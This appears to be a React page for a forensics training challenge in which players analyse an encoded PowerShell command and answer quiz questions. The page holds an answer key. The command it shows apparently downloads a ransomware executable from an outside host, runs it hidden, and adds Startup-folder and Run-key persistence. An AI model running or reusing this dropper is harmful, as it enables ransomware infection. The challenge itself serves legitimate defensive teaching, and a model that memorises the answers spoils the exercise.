import React, { useState, useEffect } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import {
  ArrowLeft,
  CheckCircle2,
  XCircle,
  HelpCircle,
  Download,
  User,
  Droplet,
  Trophy,
  ChevronDown,
  ChevronUp,
  Star
} from 'lucide-react';
import Confetti from 'react-confetti';
import Navigation from '../../components/Navigation';
import Footer from '../../components/Footer';
import { useAuth } from '../../contexts/AuthContext';

// Reusable QuestionCard Component
const QuestionCard = ({
  question,
  hintsRemaining,
  onAnswerChange,
  onSubmit,
  onToggleHint,
  progress,
}) => {
  return (
    <div
      className={`bg-gray-900/30 rounded-lg p-6 border ${
        progress?.completed
          ? 'border-green-500/20'
          : 'border-cyan-500/20 hover:bg-gray-900/40 hover:border-cyan-400/30'
      } transition-all ${
        question.isCorrect === true ? 'opacity-50' : ''
      }`}
    >
      <div className="flex items-start justify-between">
        <div className="flex-1">
          <h3 className="text-lg font-semibold mb-4">
            {question.text}
          </h3>
          <div className="flex items-center space-x-4">
            <input
              type="text"
              className={`bg-gray-800/50 border ${
                progress?.completed
                  ? 'border-green-500/20 text-green-500'
                  : 'border-cyan-500/20'
              } rounded-md px-4 py-2 focus:outline-none focus:border-cyan-400 transition-colors flex-1`}
              placeholder="Enter your answer"
              value={question.userAnswer || ''}
              onChange={(e) => onAnswerChange(question.id, e.target.value)}
              onKeyDown={(e) => {
                if (
                  e.key === 'Enter' &&
                  !question.isCorrect &&
                  !progress?.completed
                ) {
                  onSubmit(question.id, question.userAnswer);
                }
              }}
              disabled={progress?.completed || question.isCorrect === true}
            />
            {!progress?.completed && !question.isCorrect && (
              <>
                <button
                  className={`text-gray-500 hover:text-gray-400 transition-all ${
                    hintsRemaining === 0 ? 'opacity-50 cursor-not-allowed' : ''
                  }`}
                  onClick={() => onToggleHint(question.id)}
                  disabled={question.isCorrect === true || hintsRemaining === 0}
                >
                  <HelpCircle className="w-5 h-5" />
                </button>
                <button
                  className="bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 text-white py-2 px-4 rounded-lg transition-all active:scale-95"
                  onClick={() => onSubmit(question.id, question.userAnswer)}
                >
                  Submit
                </button>
              </>
            )}
            {question.isCorrect !== undefined &&
              (question.isCorrect ? (
                <CheckCircle2 className="w-6 h-6 text-green-500" />
              ) : (
                <XCircle className="w-6 h-6 text-red-500" />
              ))}
          </div>
          {question.showHint && (
            <div className="mt-4 text-gray-300 italic">{question.hint}</div>
          )}
        </div>
      </div>
    </div>
  );
};

function PowerShellChallengePage() {
  const navigate = useNavigate();
  const { profile } = useAuth();
  
  const [questions, setQuestions] = useState([
    {
      id: 1,
      text: "1. What encoding method does the script use?",
      answer: "Base64",
      hint: "Look for a common encoding technique often used for obfuscation.",
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 2,
      text: "2. What is the URL from which the malicious file is downloaded?",
      answer: "http://uhxqin.biz/csgeaivqpodqs/5849b1b61e88f7461064b986a204b9c7_wannacry.exe",
      hint: "The URL is part of the PowerShell command, check for the full string.",
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 3,
      text: "3. What is the hash of the downloaded malware file?",
      answer: "5849b1b61e88f7461064b986a204b9c7",
      hint: "The hash is often a part of the file's metadata, check the script for it.",
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 4,
      text: "4. What type of malware is being delivered by this script?",
      answer: "Ransomware",
      hint: "Consider the impact of the encryption process mentioned in the introduction.",
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 5,
      text: "5. What is the name of the downloaded file?",
      answer: "update_service.exe",
      hint: "The file name is mentioned in the PowerShell command.",
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 6,
      text: "6. Which PowerShell command is used to download the file?",
      answer: "Invoke-WebRequest -Uri $update -OutFile $destinationPath",
      hint: "Search for the download command within the script.",
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 7,
      text: "7. Where is the file stored on the system before execution?",
      answer: "TEMP",
      hint: "Check the file path in the command for where the file is stored.",
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 8,
      text: "8. Which command is used to execute the downloaded file?",
      answer: "Start-Process -FilePath $destinationPath -WindowStyle Hidden",
      hint: "Look for a command that runs an executable file in the script.",
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 9,
      text: "9. Which method does the script use to maintain persistence?",
      answer: "Startup folder",
      hint: "Persistence is often achieved by placing the file in a location that runs on startup.",
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 10,
      text: "10. Which Windows registry key is modified to establish persistence?",
      answer: "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      hint: "Persistence is often achieved through Windows registry keys.",
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
  ]);

  const [hintsRemaining, setHintsRemaining] = useState(3);
  const [showConfetti, setShowConfetti] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showError, setShowError] = useState(false);
  const [questionsVisible, setQuestionsVisible] = useState(false);
  const [xpAwarded, setXpAwarded] = useState(0);
  const [xpNotification, setXpNotification] = useState(false);
  const [showShareModal, setShowShareModal] = useState(false);
  const [windowDimensions, setWindowDimensions] = useState({
    width: window.innerWidth,
    height: window.innerHeight
  });

  // Update window dimensions when resized
  useEffect(() => {
    const handleResize = () => {
      setWindowDimensions({
        width: window.innerWidth,
        height: window.innerHeight
      });
    };

    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  // Scroll to top when component mounts
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const allQuestionsAnswered = questions.every(q => q.isCorrect !== undefined);
  const correctAnswersCount = questions.filter(q => q.isCorrect).length;
  const totalQuestions = questions.length;
  const progressPercentage = (correctAnswersCount / totalQuestions) * 100;

  const handleAnswerChange = (id, value) => {
    setQuestions(questions.map(q => q.id === id ? { ...q, userAnswer: value } : q));
  };

  const handleAnswerSubmit = (id, answer) => {
    setQuestions(questions.map(q => {
      if (q.id === id) {
        return {
          ...q,
          userAnswer: answer,
          isCorrect: answer.toLowerCase() === q.answer.toLowerCase(),
        };
      }
      return q;
    }));
  };

  const toggleHint = (id) => {
    if (hintsRemaining > 0) {
      setQuestions(questions.map(q => {
        if (q.id === id && !q.showHint) {
          setHintsRemaining(hintsRemaining - 1);
          return { ...q, showHint: true };
        }
        return q;
      }));
    }
  };

  const handleComplete = async () => {
    if (allQuestionsAnswered && correctAnswersCount === totalQuestions) {
      if (profile) {
        try {
          // In a real implementation, this would save progress to a database
          console.log('Challenge completed successfully!');
          
          // Set XP amount for beginner difficulty
          const xpAmount = 150;
          setXpAwarded(xpAmount);
          
          // Show XP notification
          setXpNotification(true);
          setTimeout(() => setXpNotification(false), 5000);
        } catch (error) {
          console.error("Error updating progress:", error);
        }
      }
      setShowConfetti(true);
      setShowSuccess(true);
      setShowError(false);
      setShowShareModal(true);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    } else {
      setShowError(true);
      setShowConfetti(false);
      setShowSuccess(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-950 text-white relative overflow-hidden">
      {/* Confetti Effect */}
      {showConfetti && (
        <Confetti
          width={windowDimensions.width}
          height={windowDimensions.height}
          recycle={true}
          numberOfPieces={200}
          gravity={0.1}
        />
      )}
      
      {/* Enhanced Animated Background */}
      <div className="fixed inset-0 pointer-events-none">
        <div className="absolute top-0 left-1/4 w-96 h-96 bg-cyan-500/5 rounded-full blur-3xl animate-pulse"></div>
        <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-500/5 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '2s' }}></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-gradient-to-r from-purple-500/3 to-pink-500/3 rounded-full blur-3xl animate-spin" style={{ animationDuration: '60s' }}></div>
      </div>

      <Navigation />

      {/* Banner */}
      <div className="flex justify-center mb-12 pt-8">
        <div className="relative group">
          <div className="absolute inset-0 rounded-lg bg-cyan-500/40 blur-lg group-hover:opacity-100 opacity-0 transition-opacity duration-300"></div>
          <img
            src="/powershell-banner2.png"
            alt="PowerShell Analysis Challenge Banner"
            className="w-auto max-h-80 object-cover rounded-lg shadow-lg group-hover:scale-105 group-hover:rotate-1 transition-transform duration-300 ease-in-out relative z-10 mt-8"
          />
        </div>
      </div>

      <div className="max-w-4xl mx-auto px-4 py-12 -mt-16 relative z-10">
        <h1 className="text-3xl font-bold mb-8">
          PowerShell Analysis Challenge
        </h1>

        {/* Progress Section */}
        <div className="mb-6">
          <div className="text-lg font-semibold mb-2">Progress</div>
          <div className="w-full bg-gray-800/20 h-4 rounded-full relative overflow-hidden">
            <div
              className="h-4 rounded-full transition-all duration-500 ease-in-out"
              style={{
                width: `${Math.round(progressPercentage)}%`,
                background: 'linear-gradient(90deg, #4ade80, #3b82f6)',
                boxShadow: '0 0 8px rgba(59, 130, 246, 0.6)',
              }}
            >
              <div className="text-center text-white text-sm font-semibold absolute inset-0 flex items-center justify-center">
                {`${Math.round(progressPercentage)}%`}
              </div>
            </div>
          </div>
          <div className="text-sm mt-2 text-gray-400">
            {correctAnswersCount} of {totalQuestions} correct
          </div>
        </div>

        {/* Hints Remaining */}
        <div className="text-gray-400 mb-6">
          Hints Remaining: {hintsRemaining}
        </div>

        {/* Challenge Introduction */}
        <div className="bg-gray-900/30 rounded-lg p-6 border border-cyan-500/20 mb-8">
          <h2 className="text-xl font-semibold mb-4">Challenge Introduction</h2>
          <p className="text-gray-400 mb-6">
            An endpoint within your organization was suddenly encrypted, leaving critical files inaccessible.
            The IT team discovered that a PowerShell command was executed shortly before the encryption occurred,
            and they need your expertise to understand what happened and how it led to the encryption.
          </p>

          {/* PowerShell Command */}
          <div className="bg-gray-950/80 border border-red-500/30 rounded-lg p-6 overflow-x-auto">
            <div className="flex items-center space-x-2 mb-4">
              <span className="text-sm font-semibold text-red-400">Suspicious PowerShell Command</span>
            </div>
            <pre className="text-gray-300 font-mono text-sm whitespace-pre-wrap break-words">
{`powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand JHVwZGF0ZSA9ICJodHRwOi8vdWh4cWluLmJpei9jc2dlYWl2cXBvZHFzLzU4NDliMWI2MWU4OGY3NDYxMDY0Yjk4NmEyMDRiOWM3X3dhbm5hY3J5LmV4ZSIgIA0KJGRlc3RpbmF0aW9uUGF0aCA9ICIkZW52OlRFTVBcdXBkYXRlX3NlcnZpY2UuZXhlIg0KDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cGRhdGUgLU91dEZpbGUgJGRlc3RpbmF0aW9uUGF0aA0KDQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZGVzdGluYXRpb25QYXRoIC1XaW5kb3dTdHlsZSBIaWRkZW4NCg0KJHN0YXJ0dXBQYXRoID0gIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcdXBkYXRlX3NlcnZpY2UuZXhlIg0KQ29weS1JdGVtIC1QYXRoICRkZXN0aW5hdGlvblBhdGggLURlc3RpbmF0aW9uICRzdGFydHVwUGF0aCAtRm9yY2UNCg0KTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAtTmFtZSAiVXBkYXRlU2VydmljZSIgLVZhbHVlICRkZXN0aW5hdGlvblBhdGggLVByb3BlcnR5VHlwZSBTdHJpbmcgLUZvcmNlDQoNCiRlbmNvZGVkQ29tbWFuZCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygncG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlICcgKyAkZGVzdGluYXRpb25QYXRoKSkNClN0YXJ0LVByb2Nlc3MgInBvd2Vyc2hlbGwuZXhlIiAtQXJndW1lbnRMaXN0ICJSZWNvZ25pemVkIGNvbXBhY3QtMC4==`}
            </pre>
          </div>
        </div>

        {/* Questions Dropdown Tab */}
        <div className="mb-6 text-center">
          <div
            onClick={() => setQuestionsVisible(!questionsVisible)}
            className="cursor-pointer border border-gray-600 rounded-lg px-4 py-2 flex items-center justify-center mx-auto hover:bg-gray-800/50 transition-all w-fit"
          >
            <span className="mr-2">Questions</span>
            {questionsVisible ? (
              <ChevronUp className="w-5 h-5" />
            ) : (
              <ChevronDown className="w-5 h-5" />
            )}
          </div>
        </div>

        {/* Questions Section */}
        {questionsVisible && (
          <div className="space-y-6">
            {questions.map((question) => (
              <QuestionCard
                key={question.id}
                question={question}
                hintsRemaining={hintsRemaining}
                onAnswerChange={handleAnswerChange}
                onSubmit={handleAnswerSubmit}
                onToggleHint={toggleHint}
                progress={null}
              />
            ))}
          </div>
        )}

        {/* Complete Button */}
        <div className="max-w-4xl mx-auto px-4 mt-8 text-center">
          <button
            onClick={handleComplete}
            className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white py-3 px-6 rounded-lg transition-all active:scale-95 flex items-center justify-center space-x-2 mx-auto"
          >
            <CheckCircle2 className="w-5 h-5" />
            <span>Complete Challenge</span>
          </button>
          {showError && (
            <div className="mt-4 p-4 bg-red-500/20 border border-red-500/30 text-red-400 rounded-lg">
              <p>Please answer all questions correctly before completing the challenge.</p>
            </div>
          )}
        </div>

        {/* XP Notification */}
        {xpNotification && (
          <div className="fixed top-20 right-4 bg-gray-900/90 border border-cyan-500/20 rounded-lg p-4 shadow-lg z-50">
            <div className="flex items-center space-x-3">
              <div className="bg-yellow-500/20 p-2 rounded-full">
                <Star className="w-6 h-6 text-yellow-500" />
              </div>
              <div>
                <p className="font-bold text-lg">+{xpAwarded} XP</p>
                <p className="text-sm text-gray-400">Challenge completed!</p>
              </div>
            </div>
          </div>
        )}

        {/* Success Message */}
        {showSuccess && (
          <div className="max-w-4xl mx-auto px-4 mt-8 text-center">
            <div className="p-4 bg-green-500/20 border border-green-500/30 text-green-400 rounded-lg">
              <p className="text-lg font-semibold">Congratulations!</p>
              <p>
                You have completed the challenge with {correctAnswersCount} out of {totalQuestions} correct answers.
              </p>
              {xpAwarded > 0 && (
                <p className="mt-2 text-yellow-300 font-bold">
                  +{xpAwarded} XP Awarded!
                </p>
              )}
            </div>
          </div>
        )}

        {/* Share Modal */}
        {showShareModal && (
          <div className="fixed inset-0 flex items-center justify-center z-50">
            <div className="absolute inset-0 bg-black opacity-50"></div>
            <div className="bg-gradient-to-r from-blue-600 to-cyan-600 rounded-lg p-8 z-50 text-center relative shadow-2xl max-w-md w-full">
              <button
                onClick={() => setShowShareModal(false)}
                className="absolute top-2 right-2 text-white hover:text-gray-200"
              >
                <XCircle className="w-6 h-6" />
              </button>
              <h2 className="text-2xl font-bold mb-4 text-white">Congratulations!</h2>
              <p className="mb-4 text-white">You have finished the challenge. Share your achievement!</p>
              <div className="flex justify-center space-x-4">
                <a
                  href="https://www.linkedin.com/sharing/share-offsite/?url=https://forensix.net/challenge/powershell-analysis"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="px-4 py-2 bg-white text-blue-600 rounded hover:bg-gray-100 font-semibold"
                >
                  Share on LinkedIn
                </a>
                <a
                  href="https://twitter.com/intent/tweet?text=I%20just%20finished%20the%20PowerShell%20Analysis%20challenge%20on%20ForensiX!"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="px-4 py-2 bg-white text-blue-600 rounded hover:bg-gray-100 font-semibold"
                >
                  Share on X
                </a>
              </div>
            </div>
          </div>
        )}

        {/* Combined Frame for Created by and First Blood */}
        <div className="max-w-4xl mx-auto px-4 mt-8">
          <div className="bg-gray-900/40 p-6 rounded-xl border border-cyan-500/20 shadow-lg hover:shadow-xl transition-shadow duration-300">
            <div className="flex flex-col md:flex-row justify-center md:space-x-8 space-y-4 md:space-y-0">
              {/* Created by section */}
              <div className="flex items-center space-x-4">
                <div className="p-3 bg-cyan-500/10 rounded-full">
                  <User className="w-6 h-6 text-cyan-400" />
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Created by:</p>
                  <div className="flex items-center space-x-2">
                    <p className="text-cyan-400 hover:text-cyan-300 font-semibold">ForensiX Team</p>
                  </div>
                </div>
              </div>

              {/* Divider */}
              <div className="hidden md:block w-px bg-cyan-500/20 h-12"></div>

              {/* First Blood section */}
              <div className="flex items-center space-x-4">
                <div className="p-3 bg-red-500/10 rounded-full">
                  <Droplet className="w-6 h-6 text-red-500" />
                </div>
                <div>
                  <p className="text-gray-400 text-sm">First Blood:</p>
                  <div className="flex items-center space-x-2">
                    <Trophy className="w-5 h-5 text-yellow-500" />
                    <p className="text-red-500 hover:text-red-400 font-semibold">ShellHunter</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  );
}

export default PowerShellChallengePage;